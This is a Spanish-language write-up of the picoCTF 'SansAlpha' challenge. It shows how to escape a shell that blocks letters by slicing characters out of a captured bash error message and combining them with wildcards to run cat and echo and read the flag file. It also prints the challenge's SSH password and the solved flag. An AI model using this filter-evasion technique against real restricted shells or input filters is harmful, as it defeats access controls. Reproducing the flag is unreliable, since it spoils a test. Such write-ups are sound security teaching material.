# SansAlpha

## Descripcion
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.`ssh -p 51175 ctf-player@mimas.picoctf.net`Use password: `6dd28e9b`

## Solucion
Nos conectamos al reto con las credenciales que nos proporcionan usando ssh:
```sh
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ ssh -p 51175 ctf-player@mimas.picoctf.net
The authenticity of host '[mimas.picoctf.net]:51175 ([52.15.88.75]:51175)' can't be established.
ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mimas.picoctf.net]:51175' (ED25519) to the list of known hosts.
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SansAlpha$  
```

Podemos ver que no podemos usar ningun comando como lo hariamos normalmente con otra shell:
```sh
SansAlpha$ ls
SansAlpha: Unknown character detected
SansAlpha$ cd
SansAlpha: Unknown character detected
```
Por lo tanto, vamos a investigar lo que nos dicen las pistas: `Where can you get some letters?`.
Buscando un poco, la unica forma que tenemos de movernos es usando `wildcards, numeros yusando redireccionadores`. Pero la forma de hacer esto, es algo bastante complejo que requiere conocimiento sobre la shell.

Para comenzar debemos de causar un error con la shell que nos proporcionan, esto lo podemos hacer simplemente escribiendo escribiendo algun caracter permitido como lo puede ser un numero:
```sh
SansAlpha$ 5
bash: 5: command not found
```
Ahora, en la shell, hay algo llamado redireccionadores de salida, lo cual nos permite mandar la salida de algun comando a algun lugar que nosotros queramos, como lo puede ser a otro comando o un archivo, en este caso, la vamos a usar para guardar el mensaje de salida del error `stderr` y despues crear un payload. Lo hacemos de la siguiente manera:
```sh
_1=`5 2>&1`
```
Aqui lo que estamos haciendo es crear una variable llamada `'_1'` a la cual le vamos a guardar el valor de salida del comando, es decir:
`bash: 5: command not found`, la forma en lo que lo conseguimos es la siguiente: le decimos que intente ejecutar el comando `'5'`, comando que no existe y por lo cual genera un mensaje de error,  entonces ahora con `'2>&1'` le estamos diciendo que tome esa salida que produce y la almacene en la variable que creamos.

Esto lo que nos permite es ahora poder formar comando sin necesidad de escribir letras, por ejemplo, podemos formar el comando cat:
```sh
#interpretamos la salida como si fuera un arreglo
#bash: 5: command not found
#${_1:9:1} -> caracter c
#${_1:1:1} -> caracter a
#${_1:19:1} -> caracter t
#${_1:2:1} -> caracter s

#podemos formar el comando /usr/bin/cat usando lo que tenemos y wildcards asi:
/?${_1:2:1}?/???/??${_1:19:1}
#el ? es un comodin que nos permite representar cualquier caracter, util para buscar patrones. 
```

Sin embargo si lo intentamos, parece ser que no funciona, nos desconecta del reto:
```sh
SansAlpha$ /?${_1:2:1}?/???/??${_1:19:1}
E: Invalid operation /usr/bin/cat

SansAlpha$ 
Traceback (most recent call last):
  File "/usr/local/sansalpha.py", line 12, in <module>
    if user_in[-1] != "\n":
IndexError: string index out of range
Connection to mimas.picoctf.net closed.
```

Pero podemos ver que funciona correctamente a pesar de que nos saca.

Es importante conocer donde esta la flag, para lo cual vamos a usar nuevamente comodines. En este caso usaremos el `'*'`:
Vamos a hacer una busqueda de patrones y ver que coincidencias encontramos, en este caso el patron que funciono es el siguiente: `./*/*`
Lo que hace es que a partir del directorio actual (`./`), va y busca cualquier coincidencia, es decir cualquier nombre de archivo o carpeta (`'*'`)  a ver si encuentra algo, en este caso si nadamas lo ejectuamos una vez, podemos ver que nos regresa el nombre de un direcrtorio:
```sh
SansAlpha$ ./*
bash: ./blargh: Is a directory
```
Y si vamos a ver que hay dentro de este, repitiendo la busqueda una vez mas, encontramos el archivo de a flag;
```
SansAlpha$ ./*/*
bash: ./blargh/flag.txt: Permission denied
```
Esto quiere decir que el nombre del archivo representado con comodines es el siguiente:
`./*/????.???`.

Ahora, puesto que usar cat no es una opcion, vamos a intentar con echo que tambien nos permite leer archivos si lo hacemos de la siguiente forma:
`echo "$(<filename)"`
Entonces hay que formar un payload para echo, como el que formamos para cat, en este caso solo tenemos la letra 'c' y la 'o', pero vamos a ver si se puede:
```sh
#/bin/echo
/???/?${_1:9:1}?${_1:10:1}
```

Si lo probamos vemos que funciona:
```
SansAlpha$ /???/?${_1:9:1}?${_1:10:1}



```

Entonces ahora solo hay que leer la flag que ya sabemos como podemos acceder a ella:
```sh
/???/?${_1:9:1}?${_1:10:1} "$(<./*/????.???)"
```

Y asi obtenemos la flag:
```flag
picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}
```

## Notas adicionales

## Referencias

https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm
https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/General%20Skills/SansAlpha.md
